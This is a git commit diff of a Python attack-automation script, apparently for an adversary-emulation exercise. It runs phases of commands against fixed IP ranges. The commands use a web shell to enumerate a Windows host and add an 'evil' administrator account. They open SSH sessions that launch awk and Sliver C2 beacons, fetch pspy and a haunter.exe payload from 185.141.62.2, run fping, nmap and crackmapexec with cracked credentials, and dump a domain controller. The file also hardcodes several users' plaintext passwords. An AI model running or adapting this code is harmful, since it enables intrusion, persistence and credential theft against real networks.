87e74dc890fad439ab74106769888c9ed62a0a6d
Shlongoh <77902863+Shlongoh@users.noreply.github.com>
2024-01-22 22:28:54 -0700

    Update AttackScripts.py

--- AttackScripts.py
+++ AttackScripts.py
@@ -78,7 +78,7 @@ def phaseOne():
 	print("FTP session ended")
 	# use curl to emulate adversary enumeration
 	whoami = "whoami%20/priv"
-	dir = "dir"
+	pwd = "pwd"
 	listDesktop = "dir%20C%3A%5CUsers%5CAdministrator%5CDesktop"
 	getDocument = "type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Clazy%5Fadmin%2Etxt"
 	#Add evil admin account with password123! as  the password.
@@ -86,25 +86,40 @@ def phaseOne():
 	# Add evil admin to administrators group
 	addAdminGroup = "net%20localgroup%20administrators%20evil%20%2Fadd"
 	systeminfo = "systeminfo"
-	log_event(f"Running curl command injections!")
+	log_event(f"initiation curl command injections against {target_ip}!")
 	# Set up URL Encoded curl requests
-	curlone = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={whoami}"
-	curltwo = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={dir}"
-	curlthree = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={listDesktop}"
-	curlfour = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={getDocument}"
-	curlfive = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addEvilAdmin}"
-	curlsix = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addAdminGroup}"
-	curlseven = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={systeminfo}"
+	#curlone = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={whoami}"
+	#curltwo = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={dir}"
+	#curlthree = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={listDesktop}"
+	#curlfour = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={getDocument}"
+	#curlfive = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addEvilAdmin}"
+	#curlsix = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addAdminGroup}"
+	#curlseven = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={systeminfo}"
 	# Execute requests
-	subprocess.run(curlone, shell=True, text=True)
-	subprocess.run(curltwo, shell=True, text=True)
-	subprocess.run(curlthree, shell=True, text=True)
-	subprocess.run(curlfour, shell=True, text=True)
-	subprocess.run(curlfive, shell=True, text=True)
-	subprocess.run(curlsix, shell=True, text=True)	
-	print("Phase One is Complete")
+	#subprocess.run(curlone, shell=True, text=True)
+	#subprocess.run(curltwo, shell=True, text=True)
+	#subprocess.run(curlthree, shell=True, text=True)
+	#subprocess.run(curlfour, shell=True, text=True)
+	#subprocess.run(curlfive, shell=True, text=True)
+	#subprocess.run(curlsix, shell=True, text=True)	
+	commands = [
+	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={whoami}",
+	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={pwd}",
+	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={listDesktop}",
+	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={getDocument}",
+	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addEvilAdmin}",
+	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addAdminGroup}",
+	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={systeminfo}"
+	]
+
+	# Execute requests using a for loop
+	for command in commands:
+		log_event(f"Executing {command}")
+		subprocess.run(command, shell=True, text=True)
+		
 	log_event("Phase One tasks finished.")
-	
+	print("Phase One is Complete.")
+
 def phaseTwo():
 	log_event("Initiating Phase Two.")
 	subnet = "208.11.23.0/24"
@@ -139,17 +154,20 @@ def phaseTwo():
 		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 		# Connect to the SSH server
+		log_event(f"Connecting to {target_ip} via SSH.")
 		client.connect(target_ip, username=username, password=password)
 
 		for command in commands:
 			# Execute each command with the password
 			full_command = f"{command}"
+			log_event(f"Command sent to SSH session {full_command}.")
 			stdin, stdout, stderr = client.exec_command(full_command)
 
 			# Print the output
 			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
 		# Finish command loop and then run C2 Beacon in the background
 		full_command = f"echo {password} | {awkC2}"
+		log_event(f"Command sent to SSH session {full_command}.")
 		stdin, stdout, stderr = client.exec_command(full_command + '&', timeout=5)
 		print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
 		# Close the SSH connection
@@ -157,8 +175,10 @@ def phaseTwo():
 	except Exception as e:
 		pass
 	print("finished phase two tasks.")
+	log_event("Phase Two tasks complete.")
 	
 def phaseThreept1():
+	log_event("Starting Phase Three Part 1.")
 	# Users ethan.renolds, backup, Kenneth.Mcneil, Alta.Dudley, Quentin.White, and Blake.Hayness added to 23.201
 	# ethan.reynolds - bubblewrap69, backup - michaelwashere Kenneth.Mcneil - password123, Alta.Dudley - hellokitty, Quentin.White - qweasdzxcQWEASDZXC, Blake.Hayness - qazwsxedcQAZWSXEDC
 	subnet = "208.11.25.0/24"
@@ -169,9 +189,13 @@ def phaseThreept1():
 	password = "michaelwashere"
 	# Run fping against the subnet
 	print(f"Running fping against the subnet {subnet}")
-	#subprocess.run(["fping", "-g", subnet, "-a"])
+	log_event(f"Fping against target {subnet}")
+	subprocess.run(["fping", "-g", subnet, "-a"])
+	print("Sleeping for 5 minutes.")
+	time.sleep(300)
 	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
-	#subprocess.run(cme, shell=True, text=True)
+	log_event(f"Running crackmapexec with cracked creds against {target_ip}")
+	subprocess.run(cme, shell=True, text=True)
 	commands = [
 	"pwd",
 	"curl http://185.141.62.2:8000/pspy -o /tmp/pspy",
@@ -184,10 +208,12 @@ def phaseThreept1():
 		# Automatically add the server's host key
 		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 		# Connect to the SSH server
+		log_event(f"Connecting to {target_ip} via SSH.")
 		client.connect(target_ip, username=username, password=password)
 		for command in commands:
 			# Execute each command with the password
 			full_command = f"{command}"
+			log_event(f"Command sent to SSH session {full_command}.")
 			stdin, stdout, stderr = client.exec_command(full_command)
 			# Print the output
 			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
@@ -195,8 +221,10 @@ def phaseThreept1():
 		client.close()
 	except Exception as e:
 		pass
+	log_event("Phase Three Part 1 complete.")
 		
 def phaseThreept2():
+	log_event("Starting Phase Three Part 2.")
 	target_ip = "208.11.25.204"
 	username = "backup"
 	password = "michaelwashere"
@@ -214,16 +242,19 @@ def phaseThreept2():
 		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 		# Connect to the SSH server
+		log_event(f"Connecting to {target_ip} via SSH.")
 		client.connect(target_ip, username=username, password=password)
 
 		for command in commands:
 			# Execute each command with the password
 			full_command = f"sudo {command}"
+			log_event(f"Command sent to SSH session {full_command}.")
 			stdin, stdout, stderr = client.exec_command(full_command)
 
 			# Print the output
 			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
 		# Finish command loop and then run C2 Beacon in the background
+		log_event(f"Command sent to SSH session {sliverC2}.")
 		stdin, stdout, stderr = client.exec_command(sliverC2, timeout=5)
 		print(f"Command: {sliverC2}\nOutput:\n{stdout.read().decode()}")
 		# Close the SSH connection
@@ -231,29 +262,58 @@ def phaseThreept2():
 	except Exception as e:
 		pass
 	print("finished phase three tasks.")
+	log_event("Phase Three Part 2 complete.")
 	
 def phaseThree():
+	log_event("Initiating Phase Three tasks.")
 	phaseThreept1()
 	print("Finished Part One. Sleeping to allow cronjob privesc to run.")
+	log_event("Sleeping to allow cron privesc to run its course.")
 	time.sleep(60)
 	print("done. Executing part two.")
 	phaseThreept2()
 	print("Phase Three done.")
+	log_event("Phase Three tasks complete.")
 
 def phaseFour():
+	log_event("Initiating Phase Four enumeration.")
+	# Run fping against the subnet
+	#print(f"Running fping against the subnet {subnet[0]}")
+	#subprocess.run(["fping", "-g", subnet[0], "-a",">","alives.txt"])
+	#print(f"Running fping against the subnet {subnet[1]}")
+	#subprocess.run(["fping", "-g", subnet[1], "-a",">>","alives.txt])
+	#print(f"Running nmap against the target IP {target_ip}")
+	#subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL","alives.txt","-oN","enum.txt"])
 	subnets = [
 	"208.11.20.0/24",
 	"208.11.21.0/24"
 	]
-	# Run fping against the subnet
-	print(f"Running fping against the subnet {subnet[0]}")
-	#subprocess.run(["fping", "-g", subnet[0], "-a",">","alives.txt"])
-	print(f"Running fping against the subnet {subnet[1]}")
-	#subprocess.run(["fping", "-g", subnet[1], "-a",">>","alives.txt])
-	print(f"Running nmap against the target IP {target_ip}")
-	#subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL","alives.txt","-oN","enum.txt"])
+	alive_hosts = []
+
+	# Run fping and populate alive_hosts list
+	for subnet in subnets:
+		log_event(f"Running fping against target {subnet}")
+		print(f"Running fping against the subnet {subnet}")
+		result = subprocess.run(["fping", "-g", subnet, "-a"], capture_output=True, text=True)
+		alive_hosts.extend(result.stdout.splitlines())
+
+	# Write alive hosts to alives.txt
+	log_event("Writing alives.txt.")
+	with open("alives.txt", "w") as file:
+		file.write("\n".join(alive_hosts))
+
+	log_event("Sleeping for 5 minutes.")
+	time.sleep(300)
+	# Run nmap against the alive hosts
+	log_event(f"Initiating aggresive nmap against alive hosts in {subnets[0]} & {subnets[1]}")
+	print(f"Running nmap against the targets {subnets[0]} and {subnets[1]}")
+	subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL", "alives.txt", "-oN", "enum.txt"])
+	log_event("Phase four enumeration complete.")
+	print("Done with enumeration. Sanders will proceed with manual log4j exploitation.")
+	
 
 def phaseFive():
+	log_event("Initiating Phase 5. Starting with dumps.")
 	DC2 = "208.11.21.100"
 	#Change with evil domain admin from phase four.
 	username = "administrator"
@@ -265,10 +325,13 @@ def phaseFive():
 	]
 	for command in commands:
 		try:
-			print(f"Running {command}. Sleeping for 30 seconds.")
+			print(f"Running {command}. Waiting for 30 seconds.")
+			log_event(f"Allowing task to run {command}.")
 			subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
 		except Exception as e:
 			pass
+	log_event(f"Dumps complete.")
+	print(f"Proceed with manual impacket-psexec and evil-winrm tasks.")
 
 	# The following is for DC2
 	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/haunter.exe -out C:\Users\Administrator\Music\haunter.exe"
